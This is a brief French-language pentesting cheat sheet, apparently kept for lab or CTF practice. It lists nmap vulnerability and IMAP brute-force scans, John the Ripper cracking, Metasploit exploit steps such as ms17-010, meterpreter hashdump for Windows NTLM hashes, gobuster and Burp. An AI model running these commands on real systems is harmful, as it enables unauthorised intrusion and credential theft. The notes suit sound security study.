## Wordlists

Sur Kali : 
`/usr/share/wordlists/`  
`/usr/share/wordlists/dirbuster/`


## nmap

`nmap -sC -sV -O 10.10.0.0-255 –script=vuln`

`nmap -p 143 --script=imap-brute --script-args userbdb=userfilename, passdb=dict.txt ip`

## john

``john --wordlist=wordlist_file.txt file_to_crack``

```
#file_to_crack

user:hash

```

## Metasploit

```
msfconsole
search {vuln_name} # ex ms17-010

use {n}
set lhost {ip}
set rhost {ip_cible}
options # check of others parameters

run
```

une fois sur l'host meterpreter est lancé, on peut lancer un shell depuis celui ci.

``meterpreter> hashdump`` # récupère les hash de la machine

Sur une machine windows
Nom_Utilisateur:RID:Hash_LM:Hash_NTLM

lors d'un hashdump, on se concentre sur la dernière partie (le hash NTLM) car le hash LM qui le précède est une antiquité inutile et non sécurisée, souvent même pas présente sur les systèmes récents. C'est le hash NTLM qui représente la clé d'accès au compte.


``meterpreter> search -f flag*``

# gobuster

`gobuster dir -w path/to/wordlist -u url`

# burp

`burpsuite`